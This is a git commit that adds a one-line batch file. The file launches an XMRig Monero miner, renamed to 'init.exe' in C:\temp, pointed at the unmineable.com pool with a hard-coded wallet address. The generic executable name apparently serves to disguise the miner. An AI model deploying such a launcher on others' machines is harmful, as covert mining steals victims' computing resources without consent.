186a16d0b5b5dfeee08858b9e4f9ef491998bd3d
nmshare <128151412+nmshare@users.noreply.github.com>
2023-03-31 16:45:13 +0300

    Create start.bat

---
+++ start.bat
@@ -0,0 +1,1 @@
+C:\temp\xmrig\xmrig-6.19.0\init.exe -o rx.unmineable.com:80 -a rx -k -u XMR:425v8KdSdJ2ZxT5zCGbFWybd4tACtRLASMegDgWr39EUhJAj5Hcx2Zk1M1Ww1HaQQ2aoumHtgRvkVBiafbGeTaUq9QW4HKE.$name -p x
